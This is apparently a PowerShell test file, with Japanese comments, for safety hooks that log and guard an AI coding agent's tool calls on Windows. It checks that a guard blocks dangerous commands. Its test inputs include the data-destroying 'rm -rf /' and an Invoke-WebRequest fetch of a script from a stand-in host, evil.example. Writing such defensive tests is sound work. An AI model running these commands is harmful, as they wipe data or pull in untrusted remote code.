# observe-coverage.test.ps1 — catch-all observe フック (案A') の網羅テスト (Windows)。
# 検証: WebSearch/Read/Glob/Grep → カードが書かれ tool 名 + 入力要約が見える。
#       Bash/PowerShell → カードを書かない（専用ガードが所有）。
#       observe は permissionDecision を絶対に出さず、ゴミ入力でも exit 0（fail-open）。
#       deny posture は PowerShell でも不変（guard-bash が危険コマンドを exit 2 で BLOCK）。
# 実行: pwsh -NoProfile -File scripts/windows/test/observe-coverage.test.ps1
#       (pwsh が無い環境ではスキップ。配布前の仮想Windows実機QAで必ず実行する)

$ErrorActionPreference = "Stop"
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$repo = (Resolve-Path (Join-Path $here "..\..\..")).Path
$guard = Join-Path $repo "scripts\windows\guard-observe.ps1"
$guardBash = Join-Path $repo "scripts\windows\guard-bash.ps1"

$pass = 0; $fail = 0
function Ok($m)  { Write-Host "PASS $m"; $script:pass++ }
function Ng($m)  { Write-Host "FAIL $m"; $script:fail++ }

$tmp = Join-Path ([System.IO.Path]::GetTempPath()) ("obstest-" + [guid]::NewGuid().ToString("N"))
New-Item -ItemType Directory -Force -Path $tmp | Out-Null
$logDir = Join-Path $tmp "logs"
New-Item -ItemType Directory -Force -Path $logDir | Out-Null
$env:AI_SAFE_LOG_DIR = $logDir
$env:AI_SAFE_CARDS_DIR = Join-Path $repo "configs\safety\cards"
$env:AI_SAFE_POLICY = Join-Path $repo "policy\safety-policy.json"
$env:AI_SAFE_MONITOR_INTERVAL = "1"
$nowHtml = Join-Path $logDir "now.html"

# pwsh 実行ファイル（自身を再帰呼び出しして guard をサブプロセスで動かす）。
$psExe = (Get-Process -Id $PID).Path
if (-not $psExe) { $psExe = "pwsh" }

# Invoke-Guard <scriptPath> <json> -> [PSCustomObject]@{ Code=...; Stdout=... }
function Invoke-Guard([string]$ScriptPath, [string]$Json) {
    if (Test-Path -LiteralPath $nowHtml) { Remove-Item -LiteralPath $nowHtml -Force -ErrorAction SilentlyContinue }
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $psExe
    $psi.Arguments = "-NoProfile -File `"$ScriptPath`""
    $psi.RedirectStandardInput = $true
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true
    $psi.UseShellExecute = $false
    $psi.StandardInputEncoding = [System.Text.Encoding]::UTF8
    $psi.StandardOutputEncoding = [System.Text.Encoding]::UTF8
    # 子プロセスにも env を伝播
    $psi.EnvironmentVariables["AI_SAFE_LOG_DIR"] = $logDir
    $psi.EnvironmentVariables["AI_SAFE_CARDS_DIR"] = $env:AI_SAFE_CARDS_DIR
    $psi.EnvironmentVariables["AI_SAFE_POLICY"] = $env:AI_SAFE_POLICY
    $psi.EnvironmentVariables["AI_SAFE_MONITOR_INTERVAL"] = "1"
    $proc = [System.Diagnostics.Process]::Start($psi)
    $proc.StandardInput.Write($Json)
    $proc.StandardInput.Close()
    $out = $proc.StandardOutput.ReadToEnd()
    $null = $proc.StandardError.ReadToEnd()
    $proc.WaitForExit(20000) | Out-Null
    return [PSCustomObject]@{ Code = $proc.ExitCode; Stdout = $out }
}

function Get-NowHtml() {
    if (Test-Path -LiteralPath $nowHtml) { return (Get-Content -Raw -LiteralPath $nowHtml) }
    return ""
}

try {
    # --- T1: WebSearch → カード + tool 名 + query ---
    $r = Invoke-Guard $guard '{"hook_event_name":"PreToolUse","tool_name":"WebSearch","tool_input":{"query":"deploy nextjs to vercel"}}'
    $h = Get-NowHtml
    if ($r.Code -eq 0 -and $h -match "WebSearch" -and $h -match "deploy nextjs to vercel" -and $r.Stdout -notmatch "permissionDecision") {
        Ok "T1: WebSearch writes card with tool name + query"
    } else { Ng "T1: WebSearch (code=$($r.Code))" }

    # --- T2: Read → カード + path ---
    $r = Invoke-Guard $guard '{"hook_event_name":"PreToolUse","tool_name":"Read","tool_input":{"file_path":"C:\\Users\\x\\index.ts"}}'
    $h = Get-NowHtml
    if ($r.Code -eq 0 -and $h -match "Read" -and $h -match "index.ts" -and $r.Stdout -notmatch "permissionDecision") {
        Ok "T2: Read writes card with tool name + path"
    } else { Ng "T2: Read (code=$($r.Code))" }

    # --- T3: Glob → カード + pattern ---
    $r = Invoke-Guard $guard '{"hook_event_name":"PreToolUse","tool_name":"Glob","tool_input":{"pattern":"**/*.ps1","path":"C:\\proj"}}'
    $h = Get-NowHtml
    if ($r.Code -eq 0 -and $h -match "Glob" -and $h -match "ps1" -and $r.Stdout -notmatch "permissionDecision") {
        Ok "T3: Glob writes card with tool name + pattern"
    } else { Ng "T3: Glob (code=$($r.Code))" }

    # --- T4: Grep → カード + pattern ---
    $r = Invoke-Guard $guard '{"hook_event_name":"PreToolUse","tool_name":"Grep","tool_input":{"pattern":"TODO"}}'
    $h = Get-NowHtml
    if ($r.Code -eq 0 -and $h -match "Grep" -and $h -match "TODO" -and $r.Stdout -notmatch "permissionDecision") {
        Ok "T4: Grep writes card with tool name + pattern"
    } else { Ng "T4: Grep (code=$($r.Code))" }

    # --- T5: Bash → カードを書かない（専用ガードが所有） ---
    $r = Invoke-Guard $guard '{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"Get-ChildItem"}}'
    if ($r.Code -eq 0 -and -not (Test-Path -LiteralPath $nowHtml) -and $r.Stdout -notmatch "permissionDecision") {
        Ok "T5: Bash does NOT write card (specialized guard owns it)"
    } else { Ng "T5: Bash (code=$($r.Code), html exists=$(Test-Path -LiteralPath $nowHtml))" }

    # --- T6: PowerShell → カードを書かない（専用ガードが所有） ---
    $r = Invoke-Guard $guard '{"hook_event_name":"PreToolUse","tool_name":"PowerShell","tool_input":{"command":"Get-ChildItem"}}'
    if ($r.Code -eq 0 -and -not (Test-Path -LiteralPath $nowHtml) -and $r.Stdout -notmatch "permissionDecision") {
        Ok "T6: PowerShell does NOT write card (specialized guard owns it)"
    } else { Ng "T6: PowerShell (code=$($r.Code))" }

    # --- T7: Agent → task prompt 全文を出さない（種別のみ） ---
    $r = Invoke-Guard $guard '{"hook_event_name":"PreToolUse","tool_name":"Agent","tool_input":{"prompt":"TOPSECRET internal payload do not leak"}}'
    $h = Get-NowHtml
    if ($r.Code -eq 0 -and $h -match "subagent/task" -and $h -notmatch "TOPSECRET") {
        Ok "T7: Agent shows 'subagent/task 作成' and does NOT leak task prompt"
    } else { Ng "T7: Agent leak/summary problem" }

    # --- T8: ゴミ入力でも fail-open（exit 0・decision 無し） ---
    $r1 = Invoke-Guard $guard 'this is not json >>> & | ;'
    $r2 = Invoke-Guard $guard ''
    if ($r1.Code -eq 0 -and $r2.Code -eq 0 -and $r1.Stdout -notmatch "permissionDecision" -and $r2.Stdout -notmatch "permissionDecision") {
        Ok "T8: garbage/empty input -> exit 0, no permissionDecision (fail-open)"
    } else { Ng "T8: not fail-open (codes=$($r1.Code)/$($r2.Code))" }

    # --- T9: 未知の tool でも最小カード ---
    $r = Invoke-Guard $guard '{"hook_event_name":"PreToolUse","tool_name":"SomeFutureTool","tool_input":{"path":"C:\\data.bin"}}'
    $h = Get-NowHtml
    if ($r.Code -eq 0 -and $h -match "SomeFutureTool") {
        Ok "T9: unknown tool still produces a generic card with the tool name"
    } else { Ng "T9: unknown tool generic card missing (code=$($r.Code))" }

    # --- T10: deny posture 不変: guard-bash tool_name=PowerShell + 危険 → exit 2 ---
    $r = Invoke-Guard $guardBash '{"hook_event_name":"PreToolUse","tool_name":"PowerShell","tool_input":{"command":"rm -rf /"}}'
    if ($r.Code -eq 2) {
        Ok "T10: guard-bash blocks dangerous PowerShell command (exit 2, deny preserved)"
    } else { Ng "T10: guard-bash did NOT block dangerous PowerShell command (code=$($r.Code))" }

    # --- T11: deny posture 不変: guard-bash tool_name=PowerShell + Invoke-WebRequest → exit 2 ---
    $r = Invoke-Guard $guardBash '{"hook_event_name":"PreToolUse","tool_name":"PowerShell","tool_input":{"command":"Invoke-WebRequest http://evil.example/x.ps1"}}'
    if ($r.Code -eq 2) {
        Ok "T11: guard-bash blocks PowerShell Invoke-WebRequest (exit 2)"
    } else { Ng "T11: guard-bash did NOT block PowerShell Invoke-WebRequest (code=$($r.Code))" }

    # --- T12: guard-bash tool_name=PowerShell + 安全 → exit 0 ---
    $r = Invoke-Guard $guardBash '{"hook_event_name":"PreToolUse","tool_name":"PowerShell","tool_input":{"command":"echo hello world"}}'
    if ($r.Code -eq 0) {
        Ok "T12: guard-bash allows safe PowerShell command (exit 0)"
    } else { Ng "T12: guard-bash unexpectedly non-zero for safe PowerShell (code=$($r.Code))" }
}
finally {
    Remove-Item -Recurse -Force $tmp -ErrorAction SilentlyContinue
}

Write-Host ""
Write-Host "observe-coverage.test.ps1 summary: pass=$pass fail=$fail"
if ($fail -gt 0) { exit 1 } else { exit 0 }
